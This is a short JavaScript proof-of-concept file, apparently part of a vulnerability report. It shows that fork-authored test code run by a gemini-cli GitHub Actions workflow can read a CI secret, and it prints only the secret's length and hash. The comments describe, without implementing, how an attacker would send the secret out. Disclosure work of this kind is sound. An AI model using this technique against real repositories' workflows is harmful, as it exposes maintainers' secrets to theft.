// payload.js -- the code that proves the vulnerability.
//
// This file belongs on the ATTACKER/FORK branch only. It stands in for
// whatever code a real malicious PR author would put in the checked-out
// repo. In the real gemini-cli workflow, this is the equivalent of
// whatever `npm run test:integration:sandbox:none` resolves to on the
// fork's own package.json -- fully attacker-authored.
//
// What it intentionally does NOT do, to keep the POC safe and within VRP
// testing rules:
//   - no outbound network calls of any kind
//   - never prints the raw secret value
//   - only writes to this run's own GitHub Actions log, which is yours
//     (the repo owner's) to view -- nothing leaves the platform
//
// A real attacker's payload would instead send DUMMY_SECRET to a server
// they control. We don't demonstrate that part: it isn't necessary to
// prove "fork-controlled code can read the secret," and building/running
// real exfiltration infrastructure, even against your own dummy value, is
// not something this POC needs to do its job.

const crypto = require('crypto');

const secret = process.env.DUMMY_SECRET || '';

console.log('=== PROOF: fork-controlled test script executed ===');
console.log('This script came from the checked-out PR ref, not from the trusted main branch.');

if (secret.length === 0) {
  console.log('DUMMY_SECRET was empty/unset in this job -- proof FAILED, env var not reachable here.');
  process.exit(1);
}

const hash = crypto.createHash('sha256').update(secret).digest('hex');
console.log(`DUMMY_SECRET is reachable. length=${secret.length} sha256=${hash}`);
console.log('(raw value intentionally never printed)');
console.log('=== END PROOF ===');
